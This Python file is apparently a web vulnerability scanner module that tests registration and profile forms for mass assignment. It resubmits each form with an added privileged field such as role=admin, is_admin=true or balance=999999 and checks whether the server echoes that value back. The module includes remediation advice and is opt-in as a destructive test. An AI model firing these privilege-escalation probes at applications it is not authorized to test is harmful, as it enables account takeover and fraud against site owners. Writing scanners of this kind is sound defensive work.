"""Mass assignment: a form that trusts fields you were never meant to send.

The application binds the request body straight onto a model. The form shows
``username`` and ``password``; the model also has ``role``, ``verified`` and
``balance``. Sending the extra field is not an exploit in the payload sense -
it is a valid request with one more key in it.

The module proves the result rather than predicting it: it submits the form
untouched, then submits the same form with one privileged field added, and
compares. A finding requires the server to *report back* the elevated value.
"""

from __future__ import annotations

import json
import re
from typing import Any

from ...models import Capability, Category, Confidence, Finding, Severity
from ..base import ScanContext
from ..http_helper import HttpModule, build_form_body

#: Fields that are never part of a public signup form but usually exist on
#: the model behind it. The value is what we try to set them to.
PRIVILEGED_FIELDS: tuple[tuple[str, str], ...] = (
    ("role", "admin"),
    ("is_admin", "true"),
    ("isAdmin", "true"),
    ("admin", "true"),
    ("verified", "true"),
    ("email_verified", "true"),
    ("is_verified", "true"),
    ("plan", "premium"),
    ("tier", "premium"),
    ("balance", "999999"),
    ("credits", "999999"),
)

#: A form is worth attacking if it creates or edits an account.
_ACCOUNT_FORM = re.compile(
    r"(?i)(register|signup|sign-up|sign_up|account|profile|user|member|create)"
)

#: A field whose presence means this is a credential form.
_CREDENTIAL_FIELDS = ("password", "passwd", "pass", "pwd")


def _reflects(body: str, field: str, value: str) -> bool:
    """Did the response report *field* with *value* as data, not as prose?"""
    text = body or ""
    # JSON: "role": "admin" / "is_admin": true / "balance": 999999
    pattern = (
        r'["\']?'
        + re.escape(field)
        + r'["\']?\s*[:=]\s*["\']?'
        + re.escape(value)
        + r'(?![A-Za-z0-9_])'
    )
    return re.search(pattern, text, re.IGNORECASE) is not None


class MassAssignmentModule(HttpModule):
    """Adds fields to account forms and checks whether the server believes them."""

    group = "auth"
    id = "mass_assignment"
    name = "Mass Assignment (privilege fields in forms)"
    description = (
        "Submits registration and profile forms with an extra privileged "
        "field - role, is_admin, verified, balance - and reports it when the "
        "server stores the value and hands it back."
    )
    severity = Severity.HIGH
    confidence = Confidence.CONFIRMED
    category = Category.AUTH
    capability = Capability.DESTRUCTIVE
    cwe = "CWE-915"
    owasp = "A04"
    tags = ["mass-assignment", "auth", "authorization", "registration"]
    remediation = (
        "Bind explicit allowlists, not whole request bodies. Declare the "
        "fields a client may set, per endpoint and per role, and reject or "
        "ignore everything else rather than defaulting it through to the model."
    )
    references = [
        "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html",
        "https://cwe.mitre.org/data/definitions/915.html",
    ]

    #: This module writes real rows to a real application, so it must be opt-in.
    requires_flag = "allow_destructive"
    max_params = 8

    async def run(self, ctx: ScanContext) -> list[Finding]:
        findings: list[Finding] = []
        seen: set[str] = set()

        for form in self._account_forms(ctx)[: self.max_params]:
            action = getattr(form, "action", "") or ""
            method = (getattr(form, "method", "post") or "post").upper()
            fields = dict(getattr(form, "fields", {}) or {})
            if not fields:
                continue
            key = f"{method}:{action}"
            if key in seen:
                continue
            seen.add(key)

            baseline = await self._submit(ctx, action, method, fields)
            if baseline is None or baseline.status >= 400:
                continue

            for name, value in PRIVILEGED_FIELDS:
                if name in fields:
                    continue
                body = dict(fields)
                body[name] = value
                probe = await self._submit(ctx, action, method, body)
                if probe is None or probe.status >= 400:
                    continue
                if not _reflects(probe.text, name, value):
                    continue
                if _reflects(baseline.text, name, value):
                    continue

                findings.append(
                    self.finding(
                        title=f"Mass assignment: '{name}' accepted on {action}",
                        target=action or ctx.target_url,
                        description=(
                            f"The account form at {action} accepted a "
                            f"'{name}' field it never offered, and returned it "
                            f"as '{value}'. The server is binding the request "
                            f"body onto its model, so any field the model has "
                            f"can be set by the client - including privilege."
                        ),
                        severity=self.severity,
                        confidence=Confidence.CONFIRMED,
                        evidence_text=(
                            f"{method} {action}\n"
                            f"  baseline : {json.dumps(dict.fromkeys(fields, '<given>'))}\n"
                            f"  probe    : {name}={value!r} added\n"
                            f"  response : {probe.text[:400]}"
                        ),
                        matched=f"{name}={value}",
                        field=name,
                        value=value,
                    )
                )
                break

        return findings

    # -- helpers ----------------------------------------------------------
    def _account_forms(self, ctx: ScanContext) -> list[Any]:
        """Forms that create or edit an account, strongest signal first."""
        candidates = []
        for form in getattr(ctx, "forms", []) or []:
            action = getattr(form, "action", "") or ""
            fields = [str(f).lower() for f in (getattr(form, "fields", {}) or {})]
            if not fields:
                continue
            credential = any(any(c in field for c in _CREDENTIAL_FIELDS) for field in fields)
            looks_like_account = bool(_ACCOUNT_FORM.search(action))
            if credential or looks_like_account:
                candidates.append(form)
        return candidates

    async def _submit(self, ctx: ScanContext, action: str, method: str, fields: dict[str, str]):
        if not action:
            return None
        try:
            if method == "GET":
                return await ctx.client.get(action, follow_redirects=False)
            body = build_form_body(fields)
            return await ctx.client.post(action, data=body, follow_redirects=False)
        except Exception:  # a dead endpoint is not a finding
            return None


__all__ = ["PRIVILEGED_FIELDS", "MassAssignmentModule"]
